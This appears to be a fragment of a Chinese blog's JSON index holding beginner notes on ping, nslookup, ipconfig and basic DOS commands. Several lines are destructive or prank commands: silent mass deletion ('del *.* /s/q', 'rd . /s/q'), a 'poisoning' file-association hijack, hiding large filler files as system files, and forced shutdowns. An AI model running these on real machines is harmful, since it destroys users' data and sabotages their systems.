测试网络连通性：**Ctrl+C 可终止 ping**             \n有去有回即为可以成功通路，若请求超时则说明**对方不在线，网络不连通**或**防火墙拦截**\n    - ping 目标IP地址              |  测试网络连通性\n    - ping -t  目标IP地址          |  一直ping\n    - ping -n 数字 目标ip地址 |  修改ping包的数量（默认4）\n    - ping -l   数字 目标ip地址  |  修改ping 包的字节数\n\n- 手工解析域名：\n    - nslookup www.baidu.com\n\n    获得DNS服务器IP：192.168.0.1\n    获得域名的IP：180.97.34.96  ,   .94\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day02.png)\n\n- 查看本地IP：可双击网卡，ipv4协议   |   或用命令\n    - ipconfig        |  查看ip基本信息\n    - ipconfig /all   |  查看ip所有信息\n\n---","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - 基本DOS命令","url":"/2020/08/02/day02-DOS/","content":"\nTab + 向上   自动补全       |       Ctrl + C     强制终止命令\n\n---\n\n# 基本命令\n\n> cd..                         返回上级目录\ncd\\                         返回根目录\nd:                            进入D盘\ncls                           清空所有dos操作\ndir                           显示当前盘符文件信息\nrd . /s/q                   清空磁盘\n\n---\n<!-- more -->\n# 浏览文件信息\n\n> type 文件名.扩展名                 显示\ntype 文件名.扩展名 | more      分页显示\n例如：dir c:\\windows | more  \n(任何命令，只要输出过多都可以用 后缀 | more 分页显示,按空格输出下一页)\n\n---\n\n# 创建文件\n\n> echo world is so amazing !           输出到屏幕\necho 字符串 >test.txt                    输出到文件，覆盖\necho 字符串 >>c:\\test.txt              输出到文件，追加\n                                                      若文件不存在，则创建该文件\n\n> copy con 文件名.扩展名 \ncon可暂时理解为屏幕，即在dos窗口中写内容，然后保存到指定文件\n输入命令后回车开始编写   ，  Ctrl + Z ，回车结束编写\n\n---\n\n# 删除文件\n\n> del 文件名.扩展名               删除该文件\ndel *.txt                               删除所有 txt/··· 结尾的文件\ndel *.*                                  删除所有文件\ndel *.* /s/q                          无提示删除所有文件\n                                            /s 所有根目录\n\n---\n\n# 文件夹\n\n> md 文件名                           创建文件夹\nattrib +h 文件名                  隐藏文件夹\nattrib -h 文件名                   取消文件夹\nattrib +h +s +a 文件名        将文件夹隐藏设为受保护的系统文件夹\ndir /a                                    显示当前磁盘所有文件，包括系统文件\n\n快速生成一个指定大小的空文件，若将其恶意隐藏为系统文件，一般较难发现\n\n> fsutil file createnew c:\\system.ini 1024000000\n在c盘创建1G的空文件\n\n---\n\n# 复制和移动\n\n> copy  源文件地址  目的地址       复制源文件到目的地址\n如：D :\\ test \\ a > copy  hello.txt   ..\\b\\ \n       将test中的a文件夹下的hello.txt 复制到 test 的b文件夹下\n       D :\\ test \\ a > copy \\test\\b\\hello.txt  .\\\n       将b文件夹下的hello.txt 复制到 当前文件夹 a中\nmove 源文件地址  目的地址       移动源文件到目的地址\nren     旧名  新名                          重命名\n\n---\n\n# 修改关联\n\n> 下毒：\nassoc .txt=exefile                  将.txt文件作为.exe文件打开\n                                              修改打开txt文件的程序 使其无法打开\n解药：\nassoc .txt=txtfile                    恢复关联\n\n---\n\n# 关机\n\n> shutdown -s -t 100                      定时关机，单位秒\nshutdown -s -f -t 秒                    定时强制关机，无任何保存提示\nshutdown -s -f -t 秒 -c \"别玩儿啦，洗洗睡吧！\"\nshutdown -r -t 秒                        定时重启\nshutdown -a                                取消一切定时\nshutdown -l                                 注销，同logoff命令相同","tags":["网络安全"],"categories":["网络安全"]}]